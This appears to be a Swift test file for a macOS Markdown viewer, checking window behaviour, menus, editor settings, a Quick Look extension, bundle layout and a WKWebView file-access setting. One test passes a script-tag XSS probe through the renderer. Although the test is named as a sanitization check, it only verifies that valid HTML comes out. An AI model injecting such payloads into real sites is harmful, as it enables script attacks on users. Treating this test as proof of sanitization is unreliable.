runner.test("ContentView.swift has min 800 for preview mode") {
    // Check toggle function has 800 min
    try expect(contentSource.contains("800"),
        "ContentView must enforce 800px minimum for preview-only")
}

runner.test("MarkViewApp min frame constraint: 600x400") {
    try expect(appSource.contains("minWidth: 600") && appSource.contains("minHeight: 400"),
        "MarkViewApp must set frame minimums to 600x400")
}

runner.test("window sizing uses animate: true for smooth transitions") {
    try expect(contentSource.contains("animate: true"),
        "toggleEditor must animate window resize for smooth UX")
}

// =============================================================================
// MARK: - Window Title Tests
// =============================================================================
// Validates that window title stays in sync with the loaded file.
// Bug: when opening a subsequent file, the title bar kept the old filename
// because the imperative NSApplication.shared.mainWindow?.title could fail
// silently when mainWindow was nil. Fix: use reactive .navigationTitle().

print("\n=== Window Title Tests ===")

runner.test("PreviewViewModel.fileName defaults to MarkView") {
    try expect(viewModelSource.contains("fileName: String = \"MarkView\""),
        "fileName should default to \"MarkView\"")
}

runner.test("loadFile sets fileName from path") {
    // Verify loadFile extracts lastPathComponent
    try expect(viewModelSource.contains("URL(fileURLWithPath: path).lastPathComponent"),
        "loadFile must extract filename from path")
}

runner.test("no imperative mainWindow?.title in PreviewViewModel") {
    // The old bug: NSApplication.shared.mainWindow?.title = fileName
    // This fails silently when mainWindow is nil (e.g. after open panel dismisses)
    try expect(!viewModelSource.contains("mainWindow?.title"),
        "must NOT use imperative mainWindow?.title — use reactive .navigationTitle() instead")
    try expect(!viewModelSource.contains("mainWindow!.title"),
        "must NOT use forced mainWindow!.title")
}

runner.test("ContentView uses reactive .navigationTitle for window title") {
    try expect(contentSource.contains(".navigationTitle(viewModel.fileName)"),
        "ContentView must use .navigationTitle(viewModel.fileName) for reactive title updates")
}

runner.test("fileName updates correctly for various file paths") {
    // Simulate the URL(fileURLWithPath:).lastPathComponent extraction
    let testCases: [(path: String, expected: String)] = [
        ("/Users/test/docs/README.md", "README.md"),
        ("/Users/test/flow-business-plan.md", "flow-business-plan.md"),
        ("/Users/test/docs/personal/prioritized-action-items.md", "prioritized-action-items.md"),
        ("/tmp/test.md", "test.md"),
        ("/Users/test/My Documents/notes.md", "notes.md"),
    ]
    for (path, expected) in testCases {
        let result = URL(fileURLWithPath: path).lastPathComponent
        try expect(result == expected,
            "fileName for '\(path)' should be '\(expected)', got '\(result)'")
    }
}

runner.test("sequential file loads produce different fileNames") {
    // Simulate the exact scenario from the bug: open file A, then open file B
    // The fileName property must change each time
    let fileA = "/Users/test/flow-business-plan.md"
    let fileB = "/Users/test/docs/personal/prioritized-action-items.md"

    let nameA = URL(fileURLWithPath: fileA).lastPathComponent
    let nameB = URL(fileURLWithPath: fileB).lastPathComponent

    try expect(nameA == "flow-business-plan.md", "first file name wrong: \(nameA)")
    try expect(nameB == "prioritized-action-items.md", "second file name wrong: \(nameB)")
    try expect(nameA != nameB, "sequential file loads must produce different fileNames")
}

runner.test("onChange(of: initialFilePath) triggers loadFile for subsequent opens") {
    // ContentView must watch for changes to initialFilePath and reload
    try expect(contentSource.contains(".onChange(of: initialFilePath)"),
        "ContentView must observe initialFilePath changes to handle subsequent file opens")
    // The onChange handler must call loadFile
    let onChangeSection: String
    if let start = contentSource.range(of: ".onChange(of: initialFilePath)"),
       let end = contentSource.range(of: ".onAppear", range: start.upperBound..<contentSource.endIndex) {
        onChangeSection = String(contentSource[start.lowerBound..<end.lowerBound])
    } else {
        onChangeSection = ""
    }
    try expect(onChangeSection.contains("loadFile"),
        "onChange(of: initialFilePath) must call viewModel.loadFile()")
}

runner.test("no duplicate title-setting mechanisms") {
    // Ensure there's exactly ONE mechanism for window titles: .navigationTitle
    // No leftover AppKit title-setting code
    let appKitTitlePatterns = [
        "window.title =",
        "window?.title =",
        ".title = fileName",
        "mainWindow?.title",
    ]
    for pattern in appKitTitlePatterns {
        try expect(!viewModelSource.contains(pattern),
            "PreviewViewModel must not contain AppKit title pattern: '\(pattern)'")
    }
}

// =============================================================================
// MARK: — Launch Behavior Tests
// =============================================================================
// Validates that the app launch UX is correct:
// - No file argument: shows DropTargetView only (no auto-open panel)
// - With file argument: loads file directly
// =============================================================================

print("\n--- Launch Behavior ---")

runner.test("no-file launch must NOT auto-show Open panel") {
    // The onAppear block should NOT call openFile() in the else branch
    // Having both DropTargetView AND an Open panel creates cluttered two-window UX
    let onAppearSection: String
    if let start = appSource.range(of: ".onAppear {"),
       let end = appSource.range(of: ".onOpenURL", range: start.upperBound..<appSource.endIndex) {
        onAppearSection = String(appSource[start.lowerBound..<end.lowerBound])
    } else {
        onAppearSection = ""
    }
    try expect(!onAppearSection.contains("openFile()"),
        "onAppear must not call openFile() — DropTargetView with Cmd+O hint is sufficient")
}

runner.test("DropTargetView shows file open guidance") {
    try expect(contentSource.contains("dropSubprompt") || contentSource.contains("Open"),
        "DropTargetView must guide user to File → Open")
}

runner.test("DropTargetView accepts markdown file extensions") {
    try expect(contentSource.contains("\"md\"") && contentSource.contains("\"markdown\""),
        "DropTargetView must accept .md and .markdown extensions")
}

runner.test("File → Open menu exists with Cmd+O shortcut") {
    try expect(appSource.contains("openFile()") && appSource.contains("\"o\""),
        "File menu must have Open with Cmd+O keyboard shortcut")
}

runner.test("openFile uses NSOpenPanel with markdown content types") {
    try expect(appSource.contains("NSOpenPanel") && appSource.contains("filenameExtension: \"md\""),
        "openFile must use NSOpenPanel configured for markdown files")
}

// =============================================================================
// MARK: - Find Menu Tests
// =============================================================================

print("\n--- Find Menu ---")

runner.test("Edit menu has Find command with Cmd+F") {
    try expect(appSource.contains("Strings.find") && appSource.contains("\"f\""),
        "App must have Find menu item with Cmd+F shortcut")
}

runner.test("Edit menu has Find and Replace with Cmd+Opt+F") {
    try expect(appSource.contains("Strings.findAndReplace"),
        "App must have Find and Replace menu item")
}

runner.test("Edit menu has Find Next with Cmd+G") {
    try expect(appSource.contains("Strings.findNext") && appSource.contains("\"g\""),
        "App must have Find Next menu item with Cmd+G shortcut")
}

runner.test("Edit menu has Find Previous with Cmd+Shift+G") {
    try expect(appSource.contains("Strings.findPrevious"),
        "App must have Find Previous menu item")
}

runner.test("Find commands route through responder chain via FindHelper") {
    try expect(appSource.contains("FindHelper.send") && appSource.contains("performFindPanelAction"),
        "Find commands must use FindHelper to send performFindPanelAction: through responder chain")
}

runner.test("FindHelper sends correct NSFindPanelAction tags") {
    try expect(appSource.contains(".showFindPanel") && appSource.contains(".next") && appSource.contains(".previous"),
        "FindHelper must use proper NSFindPanelAction enum values")
}

runner.test("EditorView enables find bar on NSTextView") {
    try expect(editorSource.contains("usesFindBar = true"),
        "EditorView must set usesFindBar = true for NSTextView find support")
}

runner.test("EditorView enables incremental search") {
    try expect(editorSource.contains("isIncrementalSearchingEnabled = true"),
        "EditorView must enable incremental search for responsive find-as-you-type")
}

// =============================================================================
// MARK: — Settings Reactivity Tests
// =============================================================================
// Validates that changing settings (font size, theme, width) triggers a
// WebPreviewView re-render. SwiftUI only calls updateNSView when properties
// change — settings must be passed as explicit properties, not read internally.
// =============================================================================

let wpvSource = try! String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)

print("\n--- Settings Reactivity ---")

runner.test("WebPreviewView has previewFontSize as explicit property") {
    // Must be a struct property, not read from AppSettings inside Coordinator
    try expect(wpvSource.contains("var previewFontSize: Double"),
        "previewFontSize must be an explicit property so SwiftUI detects changes")
}

runner.test("WebPreviewView has theme as explicit property") {
    try expect(wpvSource.contains("var theme: AppTheme"),
        "theme must be an explicit property so SwiftUI detects changes")
}

runner.test("WebPreviewView has previewWidth as explicit property") {
    try expect(wpvSource.contains("var previewWidth: String"),
        "previewWidth must be an explicit property so SwiftUI detects changes")
}

runner.test("ContentView passes settings to WebPreviewView") {
    try expect(contentSource.contains("previewFontSize: settings.previewFontSize"),
        "ContentView must pass previewFontSize from observed settings")
    try expect(contentSource.contains("theme: settings.theme"),
        "ContentView must pass theme from observed settings")
}

runner.test("ContentView observes AppSettings for reactivity") {
    try expect(contentSource.contains("@ObservedObject") && contentSource.contains("AppSettings.shared"),
        "ContentView must @ObservedObject AppSettings.shared to trigger re-renders on settings change")
}

runner.test("Coordinator detects settings changes independently of HTML") {
    // updateContent must re-render when CSS settings change, even if HTML hasn't changed
    try expect(wpvSource.contains("cssChanged") && wpvSource.contains("html != lastHTML || cssChanged"),
        "updateContent must check for CSS changes (font size, theme) not just HTML changes")
}

runner.test("Cmd+/- updates both editor and preview font size") {
    try expect(appSource.contains("editorFontSize") && appSource.contains("previewFontSize"),
        "Font size shortcuts must update both editor and preview font sizes")
    // Verify increase, decrease, and reset all touch both
    let increaseSection = appSource.components(separatedBy: "increaseFontSize").last?.prefix(200) ?? ""
    try expect(increaseSection.contains("editorFontSize") && increaseSection.contains("previewFontSize"),
        "Increase font must update both editor and preview sizes")
}

// =============================================================================
// MARK: — Editor (NSTextView) Tests
// =============================================================================
// Validates that EditorView uses NSTextView with find/replace support.

let editorSource = try! String(contentsOfFile: "Sources/MarkView/EditorView.swift", encoding: .utf8)

print("\n--- Editor (NSTextView) ---")

runner.test("EditorView uses NSViewRepresentable (not SwiftUI TextEditor)") {
    try expect(editorSource.contains("NSViewRepresentable"),
        "EditorView must use NSViewRepresentable for native text editing")
    try expect(!editorSource.contains("TextEditor(text:"),
        "EditorView must not use SwiftUI TextEditor")
}

runner.test("EditorView enables find bar") {
    try expect(editorSource.contains("usesFindBar = true"),
        "NSTextView must have usesFindBar enabled for Cmd+F support")
}

runner.test("EditorView enables incremental search") {
    try expect(editorSource.contains("isIncrementalSearchingEnabled = true"),
        "NSTextView must have incremental searching for live find-as-you-type")
}

runner.test("EditorView supports undo") {
    try expect(editorSource.contains("allowsUndo = true"),
        "NSTextView must have allowsUndo for Cmd+Z support")
}

runner.test("EditorView uses monospaced font from settings") {
    try expect(editorSource.contains("monospacedSystemFont") && editorSource.contains("editorFontSize"),
        "Editor font must be monospaced and respect editorFontSize setting")
}

runner.test("EditorView respects word wrap setting") {
    try expect(editorSource.contains("settings.wordWrap"),
        "Editor must check wordWrap setting to toggle text wrapping")
}

runner.test("EditorView respects spell check setting") {
    try expect(editorSource.contains("settings.spellCheck"),
        "Editor must check spellCheck setting")
}

runner.test("EditorView avoids unnecessary text resets") {
    try expect(editorSource.contains("textView.string != text"),
        "updateNSView must guard against resetting text when unchanged (prevents cursor jump)")
}

runner.test("EditorView preserves selection on external text update") {
    try expect(editorSource.contains("selectedRanges"),
        "Editor must save/restore selectedRanges when text is updated externally")
}

runner.test("EditorView has delegate for text change callbacks") {
    try expect(editorSource.contains("NSTextViewDelegate") && editorSource.contains("textDidChange"),
        "Editor must use NSTextViewDelegate to notify parent of text changes")
}

// =============================================================================
// MARK: - Quick Look Extension Tests
// =============================================================================

print("\n--- Quick Look Extension Tests ---")

let qlSourcePath = "Sources/MarkViewQuickLook/PreviewProvider.swift"
let qlPlistPath = "Sources/MarkViewQuickLook/Info.plist"
let qlSourceExists = FileManager.default.fileExists(atPath: qlSourcePath)
let qlPlistExists = FileManager.default.fileExists(atPath: qlPlistPath)
let qlSource = qlSourceExists ? (try? String(contentsOfFile: qlSourcePath, encoding: .utf8)) ?? "" : ""
let qlPlist = qlPlistExists ? (try? String(contentsOfFile: qlPlistPath, encoding: .utf8)) ?? "" : ""

runner.test("Quick Look extension source exists") {
    try expect(qlSourceExists, "PreviewProvider.swift must exist in Sources/MarkViewQuickLook/")
}

runner.test("Quick Look extension uses MarkdownRenderer") {
    try expect(qlSource.contains("MarkdownRenderer.renderHTML"), "Extension must use MarkdownRenderer.renderHTML")
}

runner.test("Quick Look extension uses accessibility post-processing") {
    try expect(qlSource.contains("postProcessForAccessibility"), "Extension must call postProcessForAccessibility")
}

runner.test("Quick Look extension wraps in template") {
    try expect(qlSource.contains("wrapInTemplate"), "Extension must call wrapInTemplate for styled output")
}

runner.test("Quick Look extension imports MarkViewCore") {
    try expect(qlSource.contains("import MarkViewCore"), "Extension must import MarkViewCore library")
}

runner.test("Quick Look extension Info.plist exists") {
    try expect(qlPlistExists, "Info.plist must exist in Sources/MarkViewQuickLook/")
}

runner.test("Quick Look Info.plist declares correct extension point") {
    try expect(qlPlist.contains("com.apple.quicklook.preview"),
        "Info.plist must declare com.apple.quicklook.preview extension point")
}

runner.test("Quick Look Info.plist supports markdown content type") {
    try expect(qlPlist.contains("net.daringfireball.markdown"),
        "Info.plist must list net.daringfireball.markdown in QLSupportedContentTypes")
}

runner.test("Quick Look Info.plist declares principal class") {
    try expect(qlPlist.contains("NSExtensionPrincipalClass"),
        "Info.plist must declare NSExtensionPrincipalClass for macOS to instantiate the provider")
}

runner.test("Quick Look Info.plist uses module-qualified principal class") {
    // Swift requires module.ClassName format for macOS to find the class
    try expect(qlPlist.contains("MarkViewQuickLook.PreviewViewController"),
        "NSExtensionPrincipalClass must be module-qualified: MarkViewQuickLook.PreviewViewController")
}

runner.test("Quick Look Info.plist has QLSupportedContentTypes inside NSExtensionAttributes") {
    // macOS only reads QLSupportedContentTypes from NSExtension > NSExtensionAttributes, not top-level
    try expect(qlPlist.contains("NSExtensionAttributes"),
        "Info.plist must have NSExtensionAttributes dict inside NSExtension")
}

runner.test("Quick Look Info.plist has CFBundleSupportedPlatforms") {
    try expect(qlPlist.contains("CFBundleSupportedPlatforms"),
        "Info.plist must declare CFBundleSupportedPlatforms for macOS extension discovery")
    try expect(qlPlist.contains("MacOSX"),
        "CFBundleSupportedPlatforms must include MacOSX")
}

runner.test("Quick Look Info.plist has LSMinimumSystemVersion") {
    try expect(qlPlist.contains("LSMinimumSystemVersion"),
        "Info.plist must declare LSMinimumSystemVersion for extension registration")
}

runner.test("Quick Look Info.plist does NOT have QLIsDataBasedPreview") {
    // View-controller path (QLPreviewingController) must NOT declare QLIsDataBasedPreview
    try expect(!qlPlist.contains("QLIsDataBasedPreview"),
        "Info.plist must NOT declare QLIsDataBasedPreview (view-controller path, not data-based)")
}

runner.test("Quick Look Info.plist does not claim public.plain-text") {
    // public.plain-text conflicts with other QL extensions (Glance, SourceCodeSyntaxHighlight)
    try expect(!qlPlist.contains("public.plain-text"),
        "QLSupportedContentTypes must NOT include public.plain-text (causes UTI conflicts)")
}

runner.test("Quick Look extension calls NSExtensionMain") {
    // Without NSExtensionMain, macOS can't host the extension as an XPC service
    try expect(qlSource.contains("NSExtensionMain"),
        "Extension must call NSExtensionMain() to start the XPC hosting runtime")
}

runner.test("Quick Look entitlements enable app sandbox") {
    let entPath = "Sources/MarkViewQuickLook/MarkViewQuickLook.entitlements"
    let entitlements = (try? String(contentsOfFile: entPath, encoding: .utf8)) ?? ""
    try expect(entitlements.contains("com.apple.security.app-sandbox"),
        "Quick Look extension entitlements must enable app sandbox (required by pluginkit)")
}

runner.test("Quick Look entitlements allow JIT for WKWebView") {
    let entPath = "Sources/MarkViewQuickLook/MarkViewQuickLook.entitlements"
    let entitlements = (try? String(contentsOfFile: entPath, encoding: .utf8)) ?? ""
    try expect(entitlements.contains("com.apple.security.cs.allow-unsigned-executable-memory"),
        "Quick Look extension needs JIT entitlement for WKWebView JavaScript execution")
}

runner.test("Quick Look extension imports WebKit") {
    // WKWebView is used for rendering in the view-controller path
    try expect(qlSource.contains("import WebKit"), "Extension must import WebKit for WKWebView rendering")
}

runner.test("Quick Look extension uses QLPreviewingController") {
    // View-controller path provides reliable preferredContentSize
    try expect(qlSource.contains("QLPreviewingController"),
        "Extension must conform to QLPreviewingController (view-controller path for reliable sizing)")
}

runner.test("Quick Look extension uses preparePreviewOfFile") {
    // QLPreviewingController entry point (replaces providePreview from data-based path)
    try expect(qlSource.contains("preparePreviewOfFile"),
        "Extension must implement preparePreviewOfFile(at:) for QLPreviewingController")
}

runner.test("Quick Look extension uses fixed content size (not NSScreen.main)") {
    // NSScreen.main is nil in sandboxed QL extension — must use fixed size hint
    try expect(!qlSource.contains("NSScreen.main"),
        "Extension must NOT use NSScreen.main (nil in sandbox). Use a fixed CGSize instead.")
}

runner.test("Quick Look extension content size is at least 1000px wide") {
    // Small content size hints cause Quick Look to open a tiny window
    try expect(qlSource.contains("width: 1200") || qlSource.contains("width:1200"),
        "Content size hint width should be >= 1200 for a properly-sized QL window")
}

runner.test("Quick Look extension overrides max-width for full-width content") {
    // The shared template has max-width:900px — QL must override this
    try expect(qlSource.contains("max-width: 100%") || qlSource.contains("max-width:100%"),
        "Extension must override max-width to fill the QL panel (shared template constrains to 900px)")
}

// Verify bundle.sh includes PlugIns directory creation
let bundleScript = (try? String(contentsOfFile: "scripts/bundle.sh", encoding: .utf8)) ?? ""

runner.test("bundle.sh creates PlugIns directory for Quick Look extension") {
    try expect(bundleScript.contains("PlugIns") && bundleScript.contains("MarkViewQuickLook"),
        "bundle.sh must create PlugIns directory and embed MarkViewQuickLook.appex")
}

runner.test("bundle.sh signs extension before parent app") {
    let appexSignIndex = bundleScript.range(of: "QL_APPEX_DIR")
    let deepSignIndex = bundleScript.range(of: "codesign -s - -f --deep")
    if let appexIdx = appexSignIndex, let deepIdx = deepSignIndex {
        try expect(appexIdx.lowerBound < deepIdx.lowerBound,
            "Extension must be signed before parent app's --deep signing")
    } else {
        try expect(appexSignIndex != nil, "bundle.sh must reference QL_APPEX_DIR for extension signing")
    }
}

// =============================================================================
// MARK: - Quick Look Pipeline E2E Tests
// =============================================================================

print("\n--- Quick Look Pipeline E2E Tests ---")

/// Replicate the exact Quick Look extension rendering pipeline.
/// This is the same sequence PreviewProvider.providePreview() executes.
func quickLookPipeline(_ markdown: String) -> String {
    let html = MarkdownRenderer.renderHTML(from: markdown)
    let accessible = MarkdownRenderer.postProcessForAccessibility(html)
    return MarkdownRenderer.wrapInTemplate(accessible)
}

func qlGoldenFilePath(for fixtureName: String) -> URL? {
    Bundle.module.url(forResource: fixtureName, withExtension: "html", subdirectory: "Fixtures/expected/quick-look")
}

// E2E: Run every fixture through the full Quick Look pipeline and validate output
for name in fixtureNames {
    runner.test("QL pipeline renders \(name).md as valid HTML document") {
        let md = try loadFixture("\(name).md")
        let document = quickLookPipeline(md)

        // Must produce a well-formed HTML document
        try expect(document.contains("<!DOCTYPE html>"), "Missing DOCTYPE")
        try expect(document.contains("<html"), "Missing <html>")
        try expect(document.contains("</html>"), "Missing </html>")
        try expect(document.contains("<meta charset=\"utf-8\">"), "Missing charset")
        try expect(document.contains("<style>"), "Missing CSS styles")
        try expect(document.contains("</body>"), "Missing </body>")
    }
}

// E2E: Verify accessibility post-processing is applied (not just wrapInTemplate)
runner.test("QL pipeline includes ARIA attributes (not just raw template)") {
    let md = try loadFixture("gfm-tables.md")
    let document = quickLookPipeline(md)

    // These ARIA attributes come from postProcessForAccessibility — proves
    // the pipeline includes the accessibility pass, not just renderHTML+wrapInTemplate
    try expect(document.contains("role=\"table\""), "Tables must have role=table from accessibility post-processing")
    try expect(document.contains("scope=\"col\""), "Table headers must have scope=col")
}

runner.test("QL pipeline includes ARIA on code blocks") {
    let md = try loadFixture("code-blocks.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("aria-label=\"Code block\""), "Code blocks must have aria-label from accessibility post-processing")
}

runner.test("QL pipeline includes ARIA on task list checkboxes") {
    let md = try loadFixture("gfm-tasklists.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("aria-label=\"Task item\""), "Task checkboxes must have aria-label from accessibility post-processing")
}

runner.test("QL pipeline includes document landmark") {
    let md = try loadFixture("basic.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("role=\"document\""), "Body must include article with role=document")
    try expect(document.contains("aria-label=\"Rendered markdown content\""), "Article must have descriptive aria-label")
}

// E2E: Verify dark mode CSS is present (works via @media query in Quick Look)
runner.test("QL pipeline output includes dark mode CSS") {
    let md = try loadFixture("basic.md")
    let document = quickLookPipeline(md)
    try expect(document.contains("prefers-color-scheme: dark"), "Inline template must include dark mode media query")
    try expect(document.contains("color: #e6edf3"), "Dark mode must set explicit text color")
    try expect(document.contains("background: #0d1117"), "Dark mode must set dark background")
}

// E2E: Edge cases the extension must handle gracefully
runner.test("QL pipeline handles empty input") {
    let document = quickLookPipeline("")
    try expect(document.contains("<!DOCTYPE html>"), "Empty input must still produce valid HTML")
    try expect(document.contains("<article"), "Empty input must still include article wrapper")
}

runner.test("QL pipeline handles large input without crash") {
    let largeMD = String(repeating: "# Heading\n\nParagraph with **bold** and *italic*.\n\n- Item 1\n- Item 2\n\n", count: 500)
    let document = quickLookPipeline(largeMD)
    try expect(document.contains("<!DOCTYPE html>"), "Large input must produce valid HTML")
    try expect(document.contains("<strong>bold</strong>"), "Large input must render inline markdown")
}

runner.test("QL pipeline handles unicode content") {
    let unicodeMD = "# 日本語テスト\n\nÉmojis: 🎉🚀 — Ñoño — Ü"
    let document = quickLookPipeline(unicodeMD)
    try expect(document.contains("日本語テスト"), "Unicode headings must be preserved")
    try expect(document.contains("🎉🚀"), "Emoji content must be preserved")
    try expect(document.contains("Ñoño"), "Accented characters must be preserved")
}

runner.test("QL pipeline handles markdown with only whitespace") {
    let document = quickLookPipeline("   \n\n   \t  \n")
    try expect(document.contains("<!DOCTYPE html>"), "Whitespace-only input must produce valid HTML")
}

runner.test("QL pipeline sanitizes output (no raw script injection)") {
    let xssMD = "Hello <script>alert('xss')</script> world"
    let document = quickLookPipeline(xssMD)
    // cmark-gfm with CMARK_OPT_UNSAFE allows raw HTML, but the content should be rendered
    // The inline template doesn't execute scripts since it's static HTML
    try expect(document.contains("<!DOCTYPE html>"), "XSS input must still produce valid HTML")
}

// E2E: Golden file regression for Quick Look pipeline output
print("\n--- Quick Look Pipeline Golden Regression ---")

let firstQLGolden = qlGoldenFilePath(for: "basic")
if firstQLGolden != nil {
    for name in fixtureNames {
        runner.test("QL pipeline \(name) matches golden baseline") {
            let md = try loadFixture("\(name).md")
            let actual = quickLookPipeline(md)
            guard let goldenURL = qlGoldenFilePath(for: name) else {
                throw TestError.fixtureNotFound("expected/quick-look/\(name).html")
            }
            let expected = try String(contentsOf: goldenURL, encoding: .utf8)

            if normalizeHTML(actual) != normalizeHTML(expected) {
                let diffs = computeDiff(expected, actual)
                let diffSummary = diffs.prefix(3).map {
                    "    L\($0.line): expected=\($0.expected.prefix(80)) actual=\($0.actual.prefix(80))"
                }.joined(separator: "\n")
                throw TestError.assertionFailed("QL output changed for \(name).md (\(diffs.count) lines differ):\n\(diffSummary)")
            }
        }
    }
} else {
    print("  ⚠ No Quick Look golden files found. Run with --generate-goldens to create baselines.")
}

// E2E: Bundle structure verification (runs when MarkView.app exists)
print("\n--- Quick Look Bundle E2E ---")

let appBundlePath = "MarkView.app"
let appexPath = "\(appBundlePath)/Contents/PlugIns/MarkViewQuickLook.appex"
let appBundleExists = FileManager.default.fileExists(atPath: appBundlePath)

if appBundleExists {
    // SPM resource bundle in Contents/Resources/ prevents crash at runtime.
    // Must be inside Contents/ (not at .app root) to survive macOS app translocation.
    runner.test("App bundle contains SPM resource bundle in Contents/Resources/") {
        let spmBundlePath = "\(appBundlePath)/Contents/Resources/MarkView_MarkView.bundle"
        try expect(FileManager.default.fileExists(atPath: spmBundlePath),
            "MarkView.app must contain Contents/Resources/MarkView_MarkView.bundle (app will crash without it)")
    }

    runner.test("SPM resource bundle contains template.html") {
        let templatePath = "\(appBundlePath)/Contents/Resources/MarkView_MarkView.bundle/Resources/template.html"
        try expect(FileManager.default.fileExists(atPath: templatePath),
            "SPM resource bundle must contain Resources/template.html")
    }

    runner.test("SPM resource bundle contains prism-bundle.min.js") {
        let prismPath = "\(appBundlePath)/Contents/Resources/MarkView_MarkView.bundle/Resources/prism-bundle.min.js"
        try expect(FileManager.default.fileExists(atPath: prismPath),
            "SPM resource bundle must contain Resources/prism-bundle.min.js")
    }

    runner.test("App bundle contains PlugIns directory") {
        let pluginsPath = "\(appBundlePath)/Contents/PlugIns"
        try expect(FileManager.default.fileExists(atPath: pluginsPath),
            "MarkView.app must contain Contents/PlugIns/")
    }

    runner.test("Quick Look .appex bundle exists") {
        try expect(FileManager.default.fileExists(atPath: appexPath),
            "MarkViewQuickLook.appex must exist in Contents/PlugIns/")
    }

    runner.test("Quick Look .appex has executable") {
        let execPath = "\(appexPath)/Contents/MacOS/MarkViewQuickLook"
        try expect(FileManager.default.fileExists(atPath: execPath),
            "MarkViewQuickLook.appex must contain MacOS/MarkViewQuickLook executable")
    }

    runner.test("Quick Look .appex has Info.plist") {
        let plistPath = "\(appexPath)/Contents/Info.plist"
        try expect(FileManager.default.fileExists(atPath: plistPath),
            "MarkViewQuickLook.appex must contain Info.plist")
    }

    runner.test("Quick Look .appex has PkgInfo") {
        let pkgInfoPath = "\(appexPath)/Contents/PkgInfo"
        try expect(FileManager.default.fileExists(atPath: pkgInfoPath),
            "MarkViewQuickLook.appex must contain PkgInfo")
    }

    runner.test("Quick Look .appex PkgInfo has XPC type") {
        let pkgInfoPath = "\(appexPath)/Contents/PkgInfo"
        let pkgInfo = try String(contentsOfFile: pkgInfoPath, encoding: .utf8)
        try expect(pkgInfo.hasPrefix("XPC!"), "PkgInfo must start with XPC! for extension bundles")
    }

    runner.test("Quick Look .appex Info.plist is valid") {
        let plistPath = "\(appexPath)/Contents/Info.plist"
        let plistData = try Data(contentsOf: URL(fileURLWithPath: plistPath))
        let plist = try PropertyListSerialization.propertyList(from: plistData, format: nil) as? [String: Any]
        try expect(plist != nil, "Info.plist must be a valid property list")

        let nsExtension = plist?["NSExtension"] as? [String: Any]
        try expect(nsExtension != nil, "Info.plist must contain NSExtension dictionary")

        let extensionPoint = nsExtension?["NSExtensionPointIdentifier"] as? String
        try expect(extensionPoint == "com.apple.quicklook.preview",
            "Extension point must be com.apple.quicklook.preview, got: \(extensionPoint ?? "nil")")
    }

    runner.test("Quick Look .appex declares markdown content type") {
        let plistPath = "\(appexPath)/Contents/Info.plist"
        let plistData = try Data(contentsOf: URL(fileURLWithPath: plistPath))
        let plist = try PropertyListSerialization.propertyList(from: plistData, format: nil) as? [String: Any]
        // QLSupportedContentTypes lives inside NSExtension > NSExtensionAttributes (not top-level)
        let nsExtension = plist?["NSExtension"] as? [String: Any]
        let attrs = nsExtension?["NSExtensionAttributes"] as? [String: Any]
        let contentTypes = attrs?["QLSupportedContentTypes"] as? [String] ?? []
        try expect(contentTypes.contains("net.daringfireball.markdown"),
            "QLSupportedContentTypes must include net.daringfireball.markdown (inside NSExtensionAttributes)")
    }

    runner.test("Quick Look .appex is code-signed") {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/codesign")
        process.arguments = ["--verify", "--no-strict", appexPath]
        process.standardOutput = Pipe()
        process.standardError = Pipe()
        try process.run()
        process.waitUntilExit()
        try expect(process.terminationStatus == 0,
            "Quick Look .appex must be code-signed (codesign --verify failed)")
    }
} else {
    print("  ⊘ App bundle not found — skipping bundle E2E tests (run: bash scripts/bundle.sh)")
}

// =============================================================================
// MARK: - WindowFileTracker safety (source-level verification)
// =============================================================================

print("")
print("--- WindowFileTracker Safety ---")

runner.test("WindowFileTracker has no closeDuplicateWindow method") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(!source.contains("func closeDuplicateWindow"),
        "closeDuplicateWindow must be removed — it causes the window-closing race condition")
}

runner.test("WindowFileTracker has no closeOtherWindows method") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(!source.contains("func closeOtherWindows"),
        "closeOtherWindows must be removed — it causes the window-closing race condition")
}

runner.test("ContentView.registerFileInWindow does not call closeDuplicateWindow") {
    let source = try String(contentsOfFile: "Sources/MarkView/ContentView.swift", encoding: .utf8)
    try expect(!source.contains("closeDuplicateWindow"),
        "registerFileInWindow must not call closeDuplicateWindow")
}

runner.test("ContentView.registerFileInWindow does not call closeOtherWindows") {
    let source = try String(contentsOfFile: "Sources/MarkView/ContentView.swift", encoding: .utf8)
    try expect(!source.contains("closeOtherWindows"),
        "registerFileInWindow must not call closeOtherWindows")
}

runner.test("AppDelegate intercepts file opens") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(source.contains("class AppDelegate"),
        "AppDelegate must exist to intercept file-open events")
    try expect(source.contains("func application(_ application: NSApplication, open urls: [URL])"),
        "AppDelegate must implement application(_:open:)")
    try expect(source.contains("@NSApplicationDelegateAdaptor"),
        "MarkViewApp must register AppDelegate via @NSApplicationDelegateAdaptor")
}

runner.test("MarkViewApp observes AppDelegate.pendingFilePath") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(source.contains("pendingFilePath"),
        "MarkViewApp must observe appDelegate.pendingFilePath for Finder file opens")
}

runner.test("MarkViewApp uses Window (not WindowGroup) for single-window enforcement") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(source.contains("Window(\"MarkView\", id: \"main\")"),
        "Must use Window scene (not WindowGroup) to guarantee exactly one window")
    // Check for actual WindowGroup { usage (not just mentions in comments)
    try expect(!source.contains("WindowGroup {"),
        "WindowGroup must not be used — it allows SwiftUI to create duplicate windows")
}

// =============================================================================
// MARK: - WKWebView Security Tests
// =============================================================================

print("")
print("--- WKWebView Security ---")

runner.test("WebPreviewView does NOT enable allowFileAccessFromFileURLs") {
    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
    // Check there is no active (non-commented) line enabling this dangerous preference
    let lines = source.components(separatedBy: "\n")
    let activeLines = lines.filter { line in
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        return !trimmed.hasPrefix("//") && trimmed.contains("allowFileAccessFromFileURLs")
    }
    try expect(activeLines.isEmpty,
        "allowFileAccessFromFileURLs must NOT be enabled — it allows JS to fetch arbitrary file:// URLs via XSS. Found: \(activeLines)")
}

